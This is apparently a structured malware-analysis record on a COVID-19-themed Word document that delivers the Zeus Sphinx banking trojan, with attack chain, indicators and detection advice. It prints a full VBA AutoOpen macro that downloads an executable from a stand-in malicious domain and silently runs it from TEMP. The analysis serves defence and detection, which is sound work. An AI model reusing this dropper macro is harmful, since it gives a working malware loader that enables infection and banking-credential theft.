package_info.package_name: Zeus Sphinx Banker (malicious macro in COVID-19 themed Word doc)
package_info.why_malicious: This package is a malicious Microsoft Word document distributed as a password-protected email attachment. It contains embedded VBA macros that, when enabled by the user, automatically download and execute the Zeus Sphinx banking trojan. The campaign leverages COVID-19 relief themes to lure victims, specifically targeting users of US, Canadian, and Australian banks. The macros are designed to compromise the victim's system, install the trojan, and facilitate theft of banking credentials and other sensitive information.

execution_context.trigger: When the user opens the document and enables macros
execution_context.file_location: Embedded VBA macro in the Word document (VBAProject.bin)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: When the user opens the document and enables macros, the macro executes automatically, initiates an outbound HTTP GET request to a hardcoded malicious domain to download an executable, writes the downloaded payload to the user's TEMP directory, and silently executes the file, resulting in installation of the Zeus Sphinx banking trojan.

malice_analysis.why_suspicious: The macro leverages the AutoOpen event to execute without further user interaction, downloads an executable from an external domain, writes it to disk, and executes it—all actions that are highly indicative of malware delivery and not typical for legitimate macros.
malice_analysis.violated_expectations: Legitimate Word macros should not download or execute external binaries, especially without explicit user consent. This macro violates the principle of least privilege and user awareness by performing network and file operations automatically.
malice_analysis.similar_legitimate_use: While some enterprise macros automate document formatting or data import/export, they do not download and execute arbitrary binaries from the internet. Automated document processing may use macros, but never for remote code execution.
key_indicators: AutoOpen macro triggers execution upon document open
Use of MSXML2.XMLHTTP object to perform HTTP GET requests
Creation and use of ADODB.Stream to write binary data to disk
Silent execution of downloaded file via Shell with vbHide
No user interaction required after macro is enabled

attack_chain.action: User receives a phishing email containing a password-protected Word document attachment with a COVID-19 relief theme.
attack_chain.leads_to: User opens the document and is prompted to enable macros.

attack_chain.action: User opens the attached Word document and enables macros, triggering the embedded malicious macro code.
attack_chain.leads_to: The macro initiates download and execution of the banking trojan payload.

attack_chain.action: The macro downloads the Zeus Sphinx banking trojan executable from a remote server, saves it to the TEMP directory, and executes it silently.
attack_chain.leads_to: The Zeus Sphinx banking trojan is installed on the victim's system and begins credential theft operations.

behavioral_signatures: Word document macros that use AutoOpen or Document_Open events to trigger code execution
Macros that instantiate MSXML2.XMLHTTP or WinHttpRequest objects to perform outbound HTTP requests
Macros that create and use ADODB.Stream to write binary data to disk
Office processes (e.g., WINWORD.EXE) that write executable files to the %TEMP% directory and subsequently execute them
file_indicators: Password-protected Word documents with filenames referencing COVID-19 relief or similar themes
Embedded macros containing network or file system manipulation code
Presence of payload.exe or similarly named executables in the %TEMP% directory shortly after opening a Word document
network_indicators: Outbound HTTP GET requests from Office processes to suspicious or known malicious domains (e.g., http://malicious-domain.com/payload.exe)
Office applications initiating downloads of executable files over HTTP
detection_knowledge.how_to_detect: Monitor for Office documents with macros that use AutoOpen or Document_Open events and instantiate network objects such as MSXML2.XMLHTTP or WinHttpRequest to download executables. Flag Office processes that write and execute files in the %TEMP% directory. Correlate with email attachments that are password-protected and reference COVID-19 or similar lures. Use sandboxing to analyze macro behavior and block or quarantine documents exhibiting these patterns. Scan macro code for suspicious network and file operations.
